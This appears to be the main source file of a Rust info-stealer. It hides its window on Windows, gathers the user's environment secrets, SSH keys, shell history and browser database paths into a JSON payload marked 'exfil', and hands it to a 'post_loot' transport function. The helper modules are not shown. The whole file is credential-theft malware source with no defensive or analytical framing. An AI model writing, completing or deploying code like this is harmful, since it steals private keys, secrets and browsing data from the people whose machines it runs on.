#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use agent::{collect, transport};
use serde_json::json;

fn main() {
    let home = collect::user::home_dir();
    let payload = json!({
        "timestamp": unix_now(),
        "type": "exfil",
        "user": collect::user::collect(),
        "env_secrets": collect::files::env_secrets(),
        "ssh_keys": collect::files::ssh_keys(&home),
        "shell_history": collect::files::shell_history(&home),
        "browser_paths": collect::files::browser_db_paths(&home),
    });

    transport::post_loot(&payload);
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
